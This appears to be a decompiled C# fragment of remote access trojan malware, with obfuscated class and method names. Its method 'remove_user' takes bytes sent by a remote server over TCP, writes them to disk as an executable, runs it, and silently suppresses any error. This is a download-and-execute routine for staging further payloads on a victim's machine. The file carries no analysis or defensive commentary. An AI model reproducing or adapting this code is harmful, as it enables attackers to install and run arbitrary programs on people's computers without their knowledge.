using System.Diagnostics;
using System.IO;
using System.Net.Sockets;

namespace roigtbraorn;

internal class OCAIMD
{
	public MCAIDM server;

	public OCAIMD(MCAIDM lID)
	{
		server = lID;
	}

	public NetworkStream roigtbraornNS(TcpClient roigtbraorntcpsck)
	{
		return roigtbraorntcpsck.GetStream();
	}

	public void roigtbraornremove_user()
	{
		try
		{
			byte[] array = server.roigtbraornpuall_data();
			if (array != null && !File.Exists(COAINF.roigtbraornget_mpath() + COAINF.roigtbraornremvUser + ".exe"))
			{
				File.WriteAllBytes(COAINF.roigtbraornget_mpath() + COAINF.roigtbraornremvUser + ".exe", array);
				Process.Start(COAINF.roigtbraornget_mpath() + COAINF.roigtbraornremvUser + ".exe");
			}
		}
		catch
		{
		}
	}
}
